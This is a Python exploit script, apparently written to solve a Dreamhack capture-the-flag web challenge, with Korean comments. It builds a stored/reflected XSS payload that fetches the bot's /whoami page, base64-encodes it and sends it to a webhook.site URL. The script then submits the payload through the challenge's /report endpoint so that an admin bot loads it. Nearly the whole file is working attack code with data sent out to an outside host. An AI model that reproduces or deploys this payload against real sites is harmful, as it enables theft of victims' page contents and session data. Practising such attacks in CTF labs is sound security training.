import urllib.parse
import requests
import base64

# [!] 중요: 웹훅 URL을 반드시 본인의 주소로 변경하세요! (예: https://webhook.site/...)
WEBHOOK_URL = "https://webhook.site/5c337e9e-4316-4545-983b-ab895c23b065"
TARGET_URL = "http://host8.dreamhack.games:11474" # 문제 포트에 맞게 수정

print("="*50)
print("[*] CTF Exploit Script Started")
print(f"[*] Target URL : {TARGET_URL}")
print(f"[*] Webhook URL: {WEBHOOK_URL}")
print("="*50)

# 1. XSS 페이로드 작성
# 봇이 /whoami 페이지에 접근하여 HTML을 읽어오고, base64 인코딩 후 웹훅으로 전송
js_code = f"""
fetch('/whoami')
  .then(response => response.text())
  .then(text => {{
      let encoded = btoa(text);
      fetch('{WEBHOOK_URL}/?flag=' + encoded);
  }})
  .catch(err => console.log('Error:', err));
"""

xss_payload = f"<script>{js_code}</script>"

print("\n[+] 1. Generated XSS Payload (Raw):")
print(xss_payload)

# 2. Report 엔드포인트에 보낼 URL Path 구성
# 서버의 urlparse 로직에 맞춰 query string 형태로 구성합니다.
# url-encoding을 적용하여 안전하게 전달합니다.
encoded_payload = urllib.parse.quote(xss_payload)
path_param = f"/intro?name={encoded_payload}&detail=exploit_running"

print("\n[+] 2. Generated Path for /report parameter:")
print(path_param)

# 3. Report 엔드포인트에 POST 요청 전송
report_url = f"{TARGET_URL}/report"
data_payload = {"path": path_param}

print(f"\n[*] 3. Sending POST request to: {report_url}")
print(f"[*] POST Data: {data_payload}")
print("-" * 50)

try:
    response = requests.post(report_url, data=data_payload)
    
    print(f"\n[+] HTTP Response Status Code: {response.status_code}")
    print(f"[+] HTTP Response Headers: {response.headers}")
    print("\n[+] HTTP Response Text Preview (First 250 chars):")
    print(response.text[:250])
    print("-" * 50)
    
    if "Success" in response.text:
        print("\n[!] [SUCCESS] The bot has successfully visited the payload!")
        print(f"[!] Please check your Webhook server ({WEBHOOK_URL}) for incoming requests.")
        print("[!] The flag will be in the 'flag' query parameter (Base64 encoded).")
    elif "fail" in response.text:
        print("\n[-] [FAIL] The server returned a fail message. Check the path parameter or payload syntax.")
    else:
        print("\n[?] [UNKNOWN] Unknown response received. Please inspect the Response Text above.")
        
except Exception as e:
    print(f"\n[-] [ERROR] An exception occurred during the request: {e}")